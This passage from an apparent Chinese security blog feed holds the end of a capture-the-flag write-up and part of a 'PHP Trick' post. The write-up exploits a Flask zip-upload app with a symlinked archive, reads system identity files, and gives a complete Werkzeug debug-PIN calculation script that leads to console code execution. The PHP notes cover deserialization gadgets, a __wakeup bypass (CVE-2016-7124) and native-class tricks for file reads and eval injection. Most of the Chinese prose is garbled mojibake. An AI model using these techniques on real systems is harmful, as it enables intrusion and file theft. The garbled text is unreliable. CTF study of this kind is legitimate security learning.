class="token punctuation">]</span> <span class="token operator">+</span> fn                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"templates/template.html"</span><span class="token punctuation">)</span>                x <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                ret <span class="token operator">=</span> <span class="token string">"&lt;h1>æ–‡ä»¶åˆ—è¡¨:&lt;/h1>&lt;br>&lt;hr>"</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> fn<span class="token punctuation">:</span>                    tpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'/display'</span><span class="token punctuation">,</span> extractdir<span class="token punctuation">,</span> i<span class="token punctuation">)</span>                    ret <span class="token operator">+=</span> <span class="token string">"&lt;a href='"</span> <span class="token operator">+</span> tpath <span class="token operator">+</span> <span class="token string">"'>"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"&lt;/a>&lt;br>"</span>                x <span class="token operator">=</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"HTMLTEXT"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>                <span class="token keyword">return</span> x<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    uploadpath <span class="token operator">=</span> <span class="token string">'uploads/'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>uploadpath<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>uploadpath<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            upFile <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'.zip'</span><span class="token punctuation">:</span>                filepath<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uploadpath<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>md5<span class="token punctuation">(</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token format-spec">4]</span><span class="token punctuation">&#125;</span></span><span class="token string">.zip"</span></span>                upFile<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>                zipDatas <span class="token operator">=</span> extractFile<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>                <span class="token keyword">return</span> zipDatas            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>upFile<span class="token punctuation">.</span>filename<span class="token punctuation">&#125;</span></span><span class="token string"> is not a zip file !"</span></span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> make_response<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ç»“å°±æ˜¯ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åè§£å‹ï¼Œå¹¶ä¸”åœ¨è®¿é—®æ–‡ä»¶æ—¶é€šè¿‡<code>../</code>æ¥æ‰§è¡Œç›®å½•ç©¿è¶Šï¼Œæ²¡å…³ç³»æˆ‘ä»¬ç›´æ¥ç”¨è½¯è¿æ¥<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847624.png"></p><p>å¯ä»¥çœ‹åˆ°xæ—¶ä¸€ä¸ªæŒ‡å‘æ ¹ç›®å½•çš„è½¯è¿æ¥ï¼Œå‹ç¼©ï¼Œä¸Šä¼ ï¼Œè®¿é—®ï¼Œç›®å½•ç©¿è¶Šå¯ä»¥è¿›è¡Œä»»æ„çš„æ–‡ä»¶è¯»å–äº†</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847477.png">ä½†æ˜¯è¿™æ—¶å€™æˆ‘ä»¬ç›´æ¥ç‚¹å‡»flagå‘ç°æ— æ³•è¯»å–å¹¶ä¸”æŠ¥é”™ï¼Œå¯èƒ½æ²¡æœ‰æƒé™å¹¶ä¸”debugæ¨¡å¼æ˜¯å¼€å¯çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡è®¡ç®—PINå€¼æ‰“å¼€consoleæ¥RCE<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171849327.png"></p><p>æ‰€éœ€çš„æ–‡ä»¶å¦‚ä¸‹ï¼š</p><blockquote><p>/sys/class/net/eth0/address</p><p>/etc/machine-id </p><p>/proc/sys/kernel/random/boot_id #æœ¬é¢˜ç¯å¢ƒå­˜åœ¨machine-idæ‰€ä»¥ä¸éœ€è¦boot_idäº†</p><p>/proc/self/cgroup</p></blockquote><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171857744.png"></p><p>ä½¿ç”¨è„šæœ¬æ¥è®¡ç®—PINå€¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'ctf'</span><span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># æŠ¥é”™å¾—åˆ°</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'95532648517'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span><span class="token string">'96cec10d3d9307792745ec3b85c896207445bfc71ac17f0f2e5d5488c55c3346ea36da9d417b8f57364ddc5081f3f9b1'</span><span class="token comment">#  /etc/machine-id+/proc/self/cgroup</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171853259.png"></p><p>ç›´æ¥è®¿é—®/console RCE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171854614.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;8fd00724-65fe-4c1c-a13d-83b4fc68c8aa&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP Trick</title>
      <link href="/posts/95491106.html"/>
      <url>/posts/95491106.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-Trick"><a href="#PHP-Trick" class="headerlink" title="PHP Trick"></a>PHP Trick</h1><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>é¦–å…ˆè‚¯å®šè¦æŠŠæ‰€æœ‰çš„é­”æœ¯æ–¹æ³•çœ‹ä¸€çœ‹å•¦</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ„é€ å‡½æ•°<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ææ„å‡½æ•°<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶ï¼Œ<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>åœ¨ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶ï¼Œ<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å½“å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æˆ– <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ—¶ï¼Œ<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å½“å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ—¶ï¼Œ<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•å†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•å†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ<span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å’Œ<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•ä½œç”¨åŸºæœ¬ç›¸åŒ<span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å’Œ<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•ä½œç”¨åŸºæœ¬ç›¸åŒ<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ï¼Œåªèƒ½è¿”å›å­—ç¬¦ä¸²ä¸ç„¶ä¼šé£™é”™<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨<span class="token function">__set_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å½“è°ƒç”¨ <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨<span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å¯¹è±¡å¤åˆ¶å¯ä»¥é€šè¿‡ <span class="token keyword">clone</span> å…³é”®å­—æ¥å®Œæˆï¼ˆå¦‚æœå¯èƒ½ï¼Œè¿™å°†è°ƒç”¨å¯¹è±¡çš„ <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ï¼‰ã€‚<span class="token function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å½“é€šè¿‡ <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span> è½¬å‚¨å¯¹è±¡ï¼Œè·å–åº”è¯¥è¦æ˜¾ç¤ºçš„å±æ€§çš„æ—¶å€™ï¼Œ è¯¥å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ã€‚å¦‚æœå¯¹è±¡ä¸­æ²¡æœ‰å®šä¹‰è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šå±•ç¤ºæ‰€æœ‰çš„å…¬æœ‰ã€å—ä¿æŠ¤å’Œç§æœ‰çš„å±æ€§ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>ç»å…¸çš„CVEç»•è¿‡wakeupæ–¹æ³•<strong>CVE-2016-7124</strong></p><p>å½±å“èŒƒå›´ï¼š</p><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><p>åªéœ€è¦æ„é€ å‡ºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²å¹¶å°†å±æ€§æ•°æ”¹ä¸ºå¤§äºçœŸå®å±æ€§æ•°å³å¯</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>å¯¹äºphpç‰ˆæœ¬åœ¨8.0ä»¥ä¸‹çš„ï¼Œåªè¦è®©ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šæ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ï¼Œä½†æ˜¯<code>die</code>æ–¹æ³•å®æƒ æ­£å¸¸è¿›è¡Œåƒåœ¾å›æ”¶å¹¶è§¦å‘<code>__destruct()</code>æ–¹æ³•çš„</p><h3 id="call-ï¼ˆ-callStatic-ï¼‰"><a href="#call-ï¼ˆ-callStatic-ï¼‰" class="headerlink" title="__call()ï¼ˆ__callStatic()ï¼‰"></a>__call()ï¼ˆ__callStatic()ï¼‰</h3><p>å…ˆæ¥çœ‹ä»¥ä¸‹callçš„å®˜æ–¹è¯´æ˜æ ¼å¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$function_name</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// æ–¹æ³•ä½“</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ä½ ä¼ ä¸€ä¸ªå‚æ•°ä¹Ÿå¥½å¤šä¸ªå‚æ•°ä¹Ÿç½¢ï¼Œè¿™äº›å†…å®¹éƒ½ä¼šè¢«ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨èµ·æ¥ï¼Œæ‰€ä»¥åœ¨<code>__call()</code>æ–¹æ³•ä¸­è°ƒç”¨å‚æ•°å†…å®¹æ—¶ä¸€å®šä¸€å®šè¦æŒ‰ç…§arrayçš„å½¢å¼è°ƒç”¨</p><h3 id="åŸç”Ÿç±»"><a href="#åŸç”Ÿç±»" class="headerlink" title="åŸç”Ÿç±»"></a>åŸç”Ÿç±»</h3><p>æœ‰æ—¶å€™ååºåˆ—åŒ–ä¼šç¢°åˆ°æ²¡æœ‰ç»™å‡ºè¶³å¤Ÿä½¿ç”¨çš„ç±»çš„æ—¶å€™ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€æŠŠPHPè‡ªå¸¦çš„åŸç”Ÿç±»è¿›è¡Œæ„é€ ï¼ˆä»¥ä¸‹å†…å®¹éƒ½åœ¨PHP7ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•ï¼‰</p><p><strong>Exception</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//Exception: 1 in /Users/jlan/PhpstormProjects/untitled/index.php:2 Stack trace: #0 &#123;main&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å‘ç°ä¼ å‡ºçš„å†…å®¹ä¸ºï¼š<code>Exception: ä¼ å…¥çš„å­—ç¬¦ä¸²</code>å¦‚æœæ­¤æ—¶æ­£å¥½æœ‰<code>eval</code>åŒ…è£¹äº†è¯¥ç±»å˜é‡æˆ‘ä»¬å°±èƒ½é€šè¿‡ä¼ å…¥<code>xx;æ¶æ„ä»£ç ;/*</code>è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><p><strong>FilesystemIterator</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  <span class="token comment">//index.php</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥ç›®å½•è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œ<code>toString</code>è¿”å›è¿­ä»£å™¨çš„ç¬¬ä¸€é¡¹ï¼Œå¯ä½¿ç”¨globåè®®è¿›è¡Œé€šé…</p><p><strong>DirectoryIterator</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  <span class="token comment">//index.php</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒä¸Š</p><p><strong>GlobIterator</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;new GlobIterator(&quot;.&#x2F;f*&quot;);echo $a;&#x2F;&#x2F;flag.txt?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GlobIteratorå’Œä¸Šæ–¹è¿™ä¸¤ä¸ªç±»å·®ä¸å¤šï¼Œä¸è¿‡globæ˜¯GlobIteratorç±»æœ¬èº«è‡ªå¸¦çš„ï¼Œå› æ­¤åœ¨éå†çš„æ—¶å€™ï¼Œå°±ä¸éœ€è¦å¸¦ä¸Šglobåè®®å¤´äº†ï¼Œåªéœ€è¦åé¢çš„ç›¸å…³å†…å®¹</p><p><strong>SplFileObject</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//è¯»å–æ–‡ä»¶é¦–è¡Œå†…å®¹</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SplFileObjectè¿™ä¸ªç±»è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨ä¼ªåè®®å•Š</p><p><strong>SplFileInfo</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SplFileInfo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment">//phpinfo();</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸå°ä¸åŠ¨è¿”å›ä¼ å…¥å†…å®¹</p><p><strong>Error</strong></p><p>å’Œ<strong>Exception</strong>å®Œå…¨ä¸€è‡´</p><h2 id="URLè§£æ"><a href="#URLè§£æ" class="headerlink" title="URLè§£æ"></a>URLè§£æ</h2><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" 